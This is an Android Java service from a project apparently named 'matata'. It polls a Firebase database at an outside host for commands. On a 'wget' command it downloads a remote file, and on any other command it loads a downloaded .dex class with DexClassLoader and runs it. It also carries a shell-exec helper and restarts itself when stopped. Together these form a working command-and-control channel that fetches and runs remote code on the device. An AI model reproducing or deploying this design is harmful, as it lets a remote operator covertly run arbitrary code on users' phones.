package project.richthofen911.matata;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import com.firebase.client.ChildEventListener;
import com.firebase.client.DataSnapshot;
import com.firebase.client.Firebase;
import com.firebase.client.FirebaseError;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.HashMap;
import java.util.Map;

import dalvik.system.DexClassLoader;

public class MyService extends Service {

    private static Context thisContext;
    public static Firebase refCommand;
    public static Firebase refResult;
    public static Firebase refDisplay;
    ChildEventListener eventListenerCommand;
    public static HashMap<String, String> commandSet = new HashMap<>();
    private Map<String, Object> newPostCommand;
    private String cmdRaw = "";

    public MyService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId){
        Log.e("my service up", "");
        Firebase.setAndroidContext(this);
        refCommand = new Firebase("https://hakuna-matata.firebaseio.com/command");
        refResult = new Firebase("https://hakuna-matata.firebaseio.com/result");
        refDisplay = new Firebase("https://hakuna-matata.firebaseio.com/display");
        thisContext = getApplicationContext();
        Log.e("command listener", "");
        startEventListenerCommand();

        return START_STICKY;
    }

    private void commandExecutor(String cmd){
        String[] cmdSplited = cmd.split(" ");
        if(cmdSplited[0].equals("wget")){
            wget(cmdSplited[1], cmdSplited[2], cmdSplited[3]);
        }else{
            loadDex(commandSet.get(cmd));
        }

        refCommand.removeValue();
    }

    private void wget(String url, String fileName, String fileSize) {
        Wget.asynDownloadFile(url, fileName, fileSize);
    }

    public void addCommand(String key){
        commandSet.put(key, "className");
    }

    private void loadDex(String className){
        File pathDexFile = new File(getFilesDir() + File.separator + className + ".dex");
        DexClassLoader dexClassLoader = new DexClassLoader(pathDexFile.getAbsolutePath(), getCacheDir().toString(),
                null, getClassLoader());
        try {
            Class classFunctionProvider = dexClassLoader.loadClass("project.richthofen911.matata." + className);
            DexLoaderTemplate newDex = (DexLoaderTemplate) classFunctionProvider.newInstance();
            newDex.functionality(getApplicationContext());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private String exec(String command) {
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));
            int read;
            char[] buffer = new char[4096];
            StringBuffer output = new StringBuffer();
            while ((read = reader.read(buffer)) > 0) {
                output.append(buffer, 0, read);
                //textView.append(output);
            }
            reader.close();
            process.waitFor();
            return output.toString();
        } catch (IOException e) {
            throw new RuntimeException(e);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

    private void startEventListenerCommand(){
        eventListenerCommand = refCommand.addChildEventListener(new ChildEventListener() {
            @Override
            public void onChildAdded(DataSnapshot dataSnapshot, String s) {
                //newPostCommand = (Map<String, Object>) dataSnapshot.getValue();
                //cmdRaw = (String) newPostCommand.get("cmd");
                cmdRaw = (String)dataSnapshot.getValue();
                Log.e("cmd received", cmdRaw);
                commandExecutor(cmdRaw);
            }

            @Override
            public void onChildChanged(DataSnapshot dataSnapshot, String s) {

            }

            @Override
            public void onChildRemoved(DataSnapshot dataSnapshot) {

            }

            @Override
            public void onChildMoved(DataSnapshot dataSnapshot, String s) {

            }

            @Override
            public void onCancelled(FirebaseError firebaseError) {

            }
        });
    }

    public static Context getThisContext(){
        return thisContext;
    }
}
